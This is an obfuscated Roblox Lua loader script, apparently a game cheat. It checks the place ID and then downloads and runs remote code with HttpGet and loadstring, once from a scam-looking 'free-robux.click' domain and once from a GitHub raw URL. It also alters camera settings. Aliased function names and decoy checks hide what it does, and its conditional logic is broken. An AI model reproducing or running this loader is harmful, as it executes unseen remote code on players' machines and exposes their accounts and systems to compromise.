local function tz(bool,tf,ff) if bool then if type(tf) == "function" then tf() else warn("Error") end elseif ff then if type(ff) == "function" then warn"Error" end end end
local a;local b;local c;local d;local z;a=game.PlaceId;b=assert;c=pcall d=loadstring;z=game.GetService; local i;local k;local o; i=game.HttpGet or game.HttpGetAsync;k=game; 
id = {} table.insert(id,a); if z(k,"Players").LocalPlayer.CharacterAdded then vs = true end; local f = "https://%s/%s"; local A;local B;local G;A="14044547200";B="12177325772";G="5094651510";A=A:gsub("(%d)", function(dg) return dg end);B=B:gsub("(%d)", function(dg) return dg end);G=G:gsub("(%d)", function(dg) return dg end);if tonumber(A)and tonumber(B)and tonumber(G) then print("0.0a") end

local function cpid(v) 
    local crpid = tostring(a)
    for _, val in ipairs(id) do if tostring(val) == v then return true 
    end
end
end
local function ai()
    if cpid(A) then 
        local stat, src = b(c(i, k, (f):format('skibiditoilet.free-robux.click','p/raw/bryvmasag5')))
        if stat then
            b(d(src))(); 
            z(k, "UserInputService").MouseIconEnabled = vs
        else b("Error Fetching Script: ", src)
        end
    end
    
    if cpid(B) then
        z(k, "Workspace").CurrentCamera.FieldOfView = 95
        z(k, "Players").LocalPlayer.CameraMaxZoomDistance = 999
    end
    
    if cpid(G) then 
        loadstring(game:HttpGet("https://raw.githubusercontent.com/LabibKazi858/Scripts/main/DemonFall"))()
    end
    
    
end
if a==A or B or G then
---@diagnostic disable-next-line: undefined-global
    tz(vs, ai, ff)
else
    local nl = z(k,"StarterGui")
    nl:SetCore("SendNotification", {
        Title = "Error",
        Text = "Game not supported",
        Duration ="3"
    })
end

